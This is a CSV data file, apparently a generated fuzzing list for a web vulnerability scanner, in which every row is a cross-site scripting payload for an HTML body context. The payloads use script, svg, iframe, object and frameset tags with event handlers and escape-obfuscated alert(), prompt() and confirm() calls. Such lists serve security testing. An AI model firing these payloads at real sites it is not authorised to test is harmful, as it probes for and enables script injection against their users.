eval_place,injection_code
body_tag,<video><source/onerror=alert(); /><video><source  
body_tag,<script/onerror=\u0061lert();alert``;<video><source/ 
body_tag,"<iframe/onload=alert();type=""text/x-scriptlet"" <frameset><frame confirm(1);"
body_tag,<object/data=saivs.html </frameset>javascript:alert();<a/
body_tag,"<object onerror=javascript:alert();type=""text/x-scriptlet"" onload=alert(); />"
body_tag,"<object onerror=javascript:alert();src=x "" />"
body_tag,"<object/data=saivs.html </object>onerror=\u0061lert();data=""data:text/html,"
body_tag,<iframe/onload=alert();javascript:alert(); />/
body_tag,<object/data=saivs.html <video><source//<option/
body_tag,<object data=saivs.html <img ></img>
body_tag,"data=""data:text/html,<object/onerror=\u0061lert(); /><a "
body_tag,</embed><object/data=saivs.html  /><script/
body_tag,<video><source/onerror=javascript:alert();>al\u0065rt();<input/
body_tag,<object/onerror=al\u0065rt();src=x javascript:al\u0065rt();</a>
body_tag,<body/onload=alert();src=saivs.js  /><script 
body_tag,<body onload=alert();javascript:al\u0065rt();><a/
body_tag,<iframe onload=alert();javascript:alert();></a>
body_tag,<body/onload=alert();onmouseover=alert();><a 
body_tag,<iframe javascript:\u0061lert();onerror=\u0061lert();prompt(1);<a/
body_tag,<object onerror=\u0061lert();onerror=\u0061lert(); /><a/
body_tag,<object onerror=al\u0065rt();data=saivs.html confirm(1);</a>
body_tag,"data=""data:text/html,<iframe/<embed/onload=alert(); />"
body_tag,<object/<object/onerror=\u0061lert(); />saivs.js 
body_tag,<object/data=saivs.html src=/ <script/</embed>
body_tag,<object/<embed onerror=\u0061lert(); /><canvas/
body_tag,<object onerror=javascript:alert();src=saivs.js prompt(1);</canvas>
body_tag,<object/data=saivs.html <embed ><embed/
body_tag,<object/onerror=alert();<select data=saivs.html <frameset><frame 
body_tag,"<object/onerror=javascript:alert();type=""text/x-scriptlet"" src=  </img>"
body_tag,"<body onload=alert(); <video><source/"""
body_tag,<body/onload=alert(); <video><source/al\u0065rt``;
body_tag,<object/onerror=javascript:alert(); </script>#
body_tag, <script>alert(); </script>
body_tag,<object/data=saivs.html <body onmouseover=alert();</select>
body_tag,alert``;<object data=saivs.html javascript:alert();>
body_tag,\u0061lert``;<svg/onload=alert();onerror=alert(); />
body_tag,"""<option/al\u0065rt``;\u0061lert();#"
body_tag,"\u0061lert();<iframe onload=alert();""onload=alert();"">"
body_tag,"type=""image"" <object onerror=al\u0065rt();javascript:al\u0065rt();>"
body_tag,</object><object onerror=\u0061lert();onerror=alert();>
body_tag,<object/<object onerror=alert();javascript:\u0061lert();>
body_tag,<object <select data=saivs.html onerror=\u0061lert(); />
body_tag,<svg/<object/saivs.js onload=alert();>
body_tag,<body onload=alert();src=x <frameset><frame/<img/
body_tag,<frameset><frame <select/<script/onload=alert(); />
body_tag,<object/<canvas/<script/onerror=alert();>
body_tag,<object src=/ data=saivs.html <input </iframe>
body_tag,"<object onerror=\u0061lert();javascript:alert();type=""image"" </iframe>"
body_tag,"<object onerror=javascript:alert();type=""text/x-scriptlet"" javascript:\u0061lert();</object>"
body_tag,<object/data=saivs.html confirm(1);<frameset><frame/ />
body_tag,<object data=saivs.html onload=alert();</frameset><
body_tag,<object data=saivs.html onerror=javascript:alert();</iframe>al\u0065rt();
body_tag,<object data=saivs.html </embed></canvas>saivs.js 
body_tag,<object <embed data=saivs.html </embed></img>
body_tag,"<object data=saivs.html onload=alert();""<script><video><source/"
body_tag,<object/data=saivs.html alert();</script><video><source/
body_tag,"<body onload=alert();type=""text/x-scriptlet"" <a/</a>"
body_tag,</frameset><object onerror=al\u0065rt();>javascript:\u0061lert();
body_tag,<object onerror=\u0061lert();data=saivs.html <select </embed>
body_tag,<svg onload=alert();src=saivs.js <svg </canvas>
body_tag,<object onerror=alert();src=saivs.js </iframe>src=x 
body_tag,"<frameset><frame onload=alert();""onload=alert();""<object <frameset><frame "
body_tag,<frameset><frame/onload=alert();javascript:alert();src=x <frameset><frame/
body_tag,<iframe/onload=alert();javascript:al\u0065rt();src=x <frameset><frame 
body_tag,"<iframe/onload=alert();""onload=alert();""<select </iframe>"
body_tag,<frameset><frame/onload=alert();saivs.js </object><iframe 
body_tag,<object/<canvas onerror=alert();saivs.js </iframe>
body_tag,<svg <iframe onload=alert();><embed 
body_tag,"</frameset><frameset><frame/onload=alert(); />type=""text/x-scriptlet"" "
body_tag,<iframe/<iframe/onload=alert(); />alert``;
body_tag,</frameset><frameset><frame/onload=alert();>al\u0065rt``;
body_tag,<object <iframe onerror=alert();>alert``;
body_tag,<frameset><frame <input/onload=alert(); />confirm(1);
body_tag,<frameset><frame/<input onload=alert();prompt(1); />
body_tag,<iframe <input onload=alert(); />/
body_tag,"<frameset><frame/<body onload=alert(); />"""
body_tag,<object/<input/onerror=alert();>#
body_tag,</frameset><object/onerror=al\u0065rt();src=saivs.js <video><source 
body_tag,><script/</a>\u0061lert();</script>
body_tag,<script/al\u0065rt();</a>onerror=\u0061lert();</script>
body_tag,<frameset><frame onload=alert();src=saivs.js </embed>saivs.js 
body_tag,data=<object saivs.js onerror=javascript:alert(); />
body_tag,<video><source/onerror=al\u0065rt(); /><video><source//
body_tag,<script>javascript:\u0061lert();prompt(1);</script> 
body_tag,<video><source/onerror=\u0061lert();></a>#
body_tag,<script>javascript:al\u0065rt();onerror=alert();</script> 
body_tag,src=x <iframe onload=alert(); /><option 
body_tag,<object/<object onerror=alert();><script/
body_tag,</embed><object onerror=alert(); /></img>
body_tag,<object/src=saivs.js onerror=alert();><a/
body_tag,<iframe/data=saivs.html onload=alert();><a/
body_tag,<iframe/onload=alert();saivs.js  /></a>
body_tag,<object/onerror=javascript:alert();onmouseover=alert(); /><option 
body_tag,<object/onerror=javascript:alert();al\u0065rt(); /><img/
body_tag,<svg/onload=alert();al\u0065rt();><script/
body_tag,<object/saivs.js onerror=al\u0065rt();><input 
body_tag,alert``;<svg onload=alert();saivs.js </frameset>
body_tag,javascript:al\u0065rt();<object data=saivs.html \u0061lert();<frameset><frame 
body_tag,src=  <object data=saivs.html onerror=alert();</select>
body_tag,</embed><object onerror=javascript:alert();saivs.js </select>
body_tag,<svg/<object/onload=alert();saivs.js </embed>
body_tag,<script/src=saivs.js <video><source <body/</script>
body_tag,<script>\u0061lert(); </script><script>
body_tag,<video><source onerror=alert(); </script><script>
body_tag,<video><source/onerror=javascript:alert(); /><a <video><source 
body_tag,<video><source onerror=alert(); </script><script>
body_tag,<video><source onerror=\u0061lert(); </script><script>
body_tag,<video><source/onerror=\u0061lert(); <script><script>
body_tag,<video><source src=/  <script><script>
body_tag,onerror=\u0061lert();<object/onerror=al\u0065rt(); /><select/
body_tag,javascript:alert();<object data=saivs.html ><canvas 
body_tag,javascript:alert();<object data=saivs.html  />src=x 
body_tag,<object/data=saivs.html >><object 
body_tag,<object/onerror=javascript:alert();\u0061lert``;><object/
body_tag,<object/<embed/onerror=alert(); />onerror=javascript:alert();
body_tag,<object/<svg/data=saivs.html javascript:al\u0065rt();</canvas>
body_tag,<object/data=saivs.html </object><input saivs.js 
body_tag,<object/data=saivs.html </iframe>al\u0065rt();</img>
body_tag,</select>src=x <svg/onload=alert(); />
body_tag,</select>src=  <object/onerror=al\u0065rt();>
body_tag,<embed/</embed><object/onerror=javascript:alert(); />
body_tag,data=</canvas><object onerror=al\u0065rt(); />
body_tag,"</canvas>data=""data:text/html,<body onload=alert(); />"
body_tag,"type=""image"" prompt(1);<video><source onerror=al\u0065rt(); />"
body_tag,src=x confirm(1);<a onmouseover=alert();alert``;
body_tag,<object data=saivs.html alert();<frameset><frame/data=
body_tag,<object/onerror=al\u0065rt();src=x <svg </embed>
body_tag,<object/data=saivs.html <embed/<iframe </embed>
body_tag,<object onerror=\u0061lert();src=x <embed </object>
body_tag,<object data=saivs.html </canvas>src=saivs.js <svg 
body_tag,<object data=saivs.html <option/javascript:\u0061lert();</iframe>
body_tag,"<object data=saivs.html </a>onload=alert();""data=""data:text/html,"
body_tag,"<object data=saivs.html </img>onload=alert();type=""text/x-scriptlet"" "
body_tag,<object data=saivs.html data=<object </canvas>
body_tag,<object data=saivs.html onerror=al\u0065rt();</object><object/
body_tag,<object data=saivs.html data=saivs.html <object/</object>
body_tag,data=<object onerror=alert(); />saivs.js 
body_tag,<video><source/onerror=alert(); </script></script>
body_tag,<img onerror=alert();alert``;<iframe <input/
body_tag,<frameset><frame onload=alert();data=saivs.html </frameset><canvas 
body_tag,<object onerror=alert();saivs.js </iframe></iframe>
body_tag,<object/data=saivs.html </img>><input 
body_tag,<script>onerror=al\u0065rt();</script><a/</script>
body_tag,<script>onerror=\u0061lert();</script><video><source/<script>
body_tag,<script>onmouseover=alert();</script><script <video><source/
body_tag,<script>javascript:al\u0065rt();</script><video><source/<script>
body_tag,<script>onerror=\u0061lert();</script><video><source <script>
body_tag,<script>onload=alert();</script></script></script>
body_tag,<script>alert``;</script><video><source <script>
body_tag,<script>javascript:alert();</script><script <script>
body_tag,<script>onerror=alert();</script><video><source/</script>
body_tag,<script>onerror=\u0061lert();</script></script><script>
body_tag,<script>javascript:al\u0065rt();</script><video><source <script>
body_tag,<script>al\u0065rt();</script></script><script>
body_tag,<script>onerror=al\u0065rt();</script></script></script>
body_tag,<script>onmouseover=alert();</script><script><script>
body_tag,<script>\u0061lert();</script></script></script>
body_tag,<script>\u0061lert();</script><script><script>
body_tag,<script>alert();</script><script><script>
body_tag,<script>onmouseover=alert();</script></script></script>
body_tag,<script>al\u0065rt``;</script></script></script>
body_tag,<script>al\u0065rt();</script><script><script>
body_tag,<script>onerror=alert();</script><script><script>
body_tag,<script>prompt(1);</script><script><script>
body_tag,<script>alert();</script><script><script>
body_tag,<script>alert``;</script><script/</script>
body_tag,<script>\u0061lert();</script></script></script>
body_tag,<script>confirm(1);</script><script><script>
body_tag,<script>onload=alert(); </script><video><source 
body_tag,<script>onmouseover=alert(); </script><video><source/
body_tag,<script>javascript:\u0061lert(); </script><video><source/
body_tag,<script>onload=alert(); </script><frameset><frame 
body_tag,<script>javascript:\u0061lert(); </script></object>
body_tag,"<body/onload=alert();type=""text/x-scriptlet"" <iframe/</embed>"
body_tag,<object/data=saivs.html confirm(1);<svg </script>
body_tag,src=saivs.js <iframe/onload=alert();data=saivs.html </script>
body_tag,<object <canvas data=saivs.html ><a/
body_tag,<frameset><frame <canvas/onload=alert(); /><script/
body_tag,<object/<embed data=saivs.html  /><a/
body_tag,<object <canvas/onerror=\u0061lert();><option 
body_tag,<svg src=x onload=alert(); /><input 
body_tag,<object data=saivs.html </img> />onmouseover=alert();
body_tag,<object/data=saivs.html </img><javascript:al\u0065rt();
body_tag,<object data=saivs.html </iframe><</embed>
body_tag,<frameset><frame <embed/onload=alert(); />src=saivs.js 
body_tag,<object/onerror=\u0061lert(); </script>javascript:al\u0065rt();
body_tag,<object onerror=al\u0065rt(); <script>onerror=\u0061lert();
body_tag,<body/onload=alert(); <script><body/
body_tag,<object/onerror=al\u0065rt(); <script>data=
body_tag,"<object onerror=\u0061lert(); <video><source type=""text/x-scriptlet"" "
body_tag,<svg/onload=alert(); <script><img 
body_tag,<object data=saivs.html  <video><source onerror=javascript:alert();
body_tag,<body/onload=alert(); <script><a/
body_tag,<iframe/onload=alert(); </script><svg 
body_tag,<object onerror=alert(); <script><input 
body_tag,<object onerror=alert(); <script><a 
body_tag,<object onerror=alert(); </script><video><source/
body_tag,<body/onload=alert();> /><canvas 
body_tag,</img><object data=saivs.html </canvas><option 
body_tag,<script </select>onmouseover=alert();saivs.js </script>
body_tag,<object data=saivs.html onerror=\u0061lert();</select></select>
body_tag,<object data=saivs.html </object><input/<
body_tag,"<object type=""image"" <iframe onerror=\u0061lert(); />"
body_tag,"<object data=saivs.html <frameset><frame data=""data:text/html,al\u0065rt``;"
body_tag,<object data=saivs.html </frameset>\u0061lert();</select>
body_tag,<object/data=saivs.html <object javascript:\u0061lert();</select>
body_tag,<object data=saivs.html </embed>onerror=alert();<input 
body_tag,<object data=saivs.html </select>onerror=alert();</iframe>
body_tag,<object data=saivs.html </embed>saivs.js <input/
body_tag,<object/data=saivs.html </a></iframe>saivs.js 
body_tag,"src=  <object/onerror=alert(); />type=""text/x-scriptlet"" "
body_tag,"<svg/type=""text/x-scriptlet"" onload=alert();></select>"
body_tag,<object <embed onerror=al\u0065rt(); /></canvas>
body_tag,<iframe/onload=alert();\u0061lert(); /><object/
body_tag,"<body/onload=alert();""saivs.js <<svg "
body_tag,<body onload=alert();\u0061lert``; /><frameset><frame/
body_tag,<iframe/onload=alert();saivs.js <<frameset><frame 
body_tag,<iframe/onload=alert();alert(); /></iframe>
body_tag,<body/onload=alert();\u0061lert(); /><frameset><frame 
body_tag,<frameset><frame onload=alert();saivs.js  /><frameset><frame 
body_tag,"<iframe onload=alert();""alert();""<frameset><frame/"
body_tag,<object onerror=alert();\u0061lert(); /><frameset><frame 
body_tag,<svg onload=alert();javascript:al\u0065rt();></frameset>
body_tag,<frameset><frame/onload=alert();saivs.js confirm(1);</iframe>
body_tag,<svg/onload=alert();javascript:al\u0065rt();></iframe>
body_tag,<body/<img onload=alert();> 
body_tag,<script <embed/src=saivs.js </script></script>
body_tag,<script> \u0061lert``;</script><video><source 
body_tag,<object/onerror=alert();>#<script 
body_tag,"data=""data:text/html,<object data=saivs.html <input </object>"
body_tag,onerror=alert();<object data=saivs.html <iframe <frameset><frame 
body_tag,alert();<object data=saivs.html </iframe></a>
body_tag,"onload=alert();""<object/data=saivs.html <frameset><frame/</img>"
body_tag,<script//</script>prompt(1);</script>
body_tag,<script /</script>javascript:al\u0065rt();</script>
body_tag,</iframe><body onload=alert();>al\u0065rt();
body_tag,</select><object/data=saivs.html confirm(1);</object>
body_tag,</select><object onerror=al\u0065rt();></canvas>
body_tag,onload=alert();<body/onload=alert();><svg/
body_tag,onerror=al\u0065rt();<iframe/onload=alert();saivs.js </iframe>
body_tag,prompt(1);<object data=saivs.html <frameset><frame <select/
body_tag,<object data=saivs.html javascript:alert();<frameset><frame/<embed/
body_tag,"<svg onload=alert();type=""text/x-scriptlet"" </img></img>"
body_tag,"<frameset><frame/onload=alert();type=""image"" </iframe><body/"
body_tag,<body onload=alert();src=saivs.js </frameset><input 
body_tag,<frameset><frame/<embed/onload=alert(); /><svg 
body_tag,<object/<embed/onerror=al\u0065rt(); /><svg/
body_tag,<object <embed onerror=\u0061lert();><frameset><frame 
body_tag,"<object/onerror=\u0061lert();type=""image"" #</select>"
body_tag,"<object/type=""image"" onerror=al\u0065rt(); /><object/"
body_tag,<object/data=saivs.html </img>al\u0065rt``;src=  
body_tag,<object/<embed/<input data=saivs.html <frameset><frame 
body_tag,<script/</img>alert``;</script> />
body_tag,<script </frameset>confirm(1);</script> 
body_tag,<object data=saivs.html <select/>onerror=al\u0065rt();
body_tag,<object/src=saivs.js data=saivs.html \u0061lert``;</frameset>
body_tag,<object/data=saivs.html \u0061lert();alert``;</a>
body_tag,</object><object/onerror=\u0061lert();><a/
body_tag, <object data=saivs.html </a> 
body_tag, /><video><source/onerror=\u0061lert();> 
body_tag,<object onerror=al\u0065rt();saivs.js <video><source <video><source/
body_tag,<object data=saivs.html onmouseover=alert();<video><source/<script 
body_tag,<object/<svg data=saivs.html </select><img/
body_tag,<object <object data=saivs.html </img><option 
body_tag,<object/<input data=saivs.html </img><svg/
body_tag,"<iframe/<object onload=alert();type=""image"" >"
body_tag,"type=""text/x-scriptlet"" <object <embed onerror=alert();>"
body_tag,<frameset><frame onload=alert();data=saivs.html </embed>\u0061lert();
body_tag,<frameset><frame/onload=alert();data=saivs.html </frameset><canvas/
body_tag,<object onerror=al\u0065rt();src=saivs.js <svg/</object>
body_tag,<object/saivs.js data=saivs.html <frameset><frame/<frameset><frame 
body_tag,<object onerror=alert();saivs.js alert``;</a>
body_tag,<video><source/onerror=al\u0065rt();></script><frameset><frame 
body_tag,<script/</embed>al\u0065rt();</script></object>
body_tag,<script/</embed>al\u0065rt();</script><frameset><frame 
body_tag,<script/</canvas>alert();</script><svg/
body_tag,<script/</frameset>javascript:alert();</script><frameset><frame/
body_tag,<script/</embed>onmouseover=alert();</script><iframe/
body_tag,<script/</select>onload=alert();</script><iframe 
body_tag,<script </embed>al\u0065rt();</script></img>
body_tag,"<iframe/onload=alert();type=""text/x-scriptlet"" saivs.js </select>"
body_tag,<embed/src=  javascript:alert();></a>
body_tag,<object/src=x data=saivs.html </script>javascript:\u0061lert();
body_tag,<object onerror=javascript:alert();src=saivs.js </object><a/
body_tag,"<object onerror=javascript:alert();type=""text/x-scriptlet"" <frameset><frame <option "
body_tag,<object/data=saivs.html > src=x 
body_tag,<object data=saivs.html \u0061lert``;/</a>
body_tag,<object onerror=\u0061lert();> <a/
body_tag,<object/data=saivs.html saivs.js '</a>
body_tag,<object onerror=javascript:alert();onload=alert();><option 
body_tag,<object/onerror=javascript:alert();javascript:\u0061lert(); /><img 
body_tag,<frameset><frame onload=alert();onerror=alert();></a>
body_tag,<object <object data=saivs.html <video><source/onerror=alert();
body_tag,<object data=saivs.html <object <embed </a>
body_tag,"<object/data=saivs.html <frameset><frame/type=""text/x-scriptlet"" <img "
body_tag,<object data=saivs.html </canvas>src=x </img>
body_tag,<object/data=saivs.html </iframe>javascript:\u0061lert();<input 
body_tag,<object data=saivs.html </a>alert();<input/
body_tag,/<script </a>javascript:al\u0065rt();</script>
body_tag,<body/onmouseover=alert();<a onload=alert();>
body_tag,<frameset><frame/<select <script onload=alert(); />
body_tag,<object/data=saivs.html <frameset><frame onerror=al\u0065rt();\u0061lert();
body_tag,"type=""text/x-scriptlet"" <object/onerror=alert();onerror=alert(); />"
body_tag,src=saivs.js <object/onerror=alert();javascript:alert();>
body_tag,<object <object onerror=alert();saivs.js <frameset><frame/
